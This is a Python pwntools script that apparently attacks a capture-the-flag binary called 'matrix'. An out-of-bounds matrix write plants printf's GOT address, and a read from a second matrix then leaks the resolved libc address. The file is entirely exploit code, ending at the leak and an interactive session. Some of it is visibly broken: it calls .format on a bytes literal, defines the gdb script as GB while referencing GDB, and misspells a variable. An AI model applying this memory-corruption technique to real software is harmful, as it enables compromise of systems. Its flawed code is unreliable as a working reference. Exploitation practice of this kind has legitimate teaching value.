from pwn import *
import struct

prog = ['./matrix']

GOT_PRINTF = 0x804a108

p = process(argv=prog, executable=prog[0])

def to_int(floating):
    return struct.unpack('I', struct.pack("f", floating))[0]

def to_float(val):
    return struct.unpack('f', struct.pack('I', val))[0]

p.sendline(b'create 6 5')
p.sendline(b'create 1 1')
p.sendline(b'set 0 5 4 {}'.format(to_float(GOT_PRINTF)))
p.sendline(b'get 1 0 0')

p.recvuntil('Matrix[0][0] = ')
d = p.recvuntil('\n')
pritf_addr = to_int(float(d))

info("printf: " + hex(pritf_addr))

GB = """
x32x 0x804a180
x64 *0x804a180
b*0x8048c21
"""
#gdb.attach(p, GDB)

p.interactive()
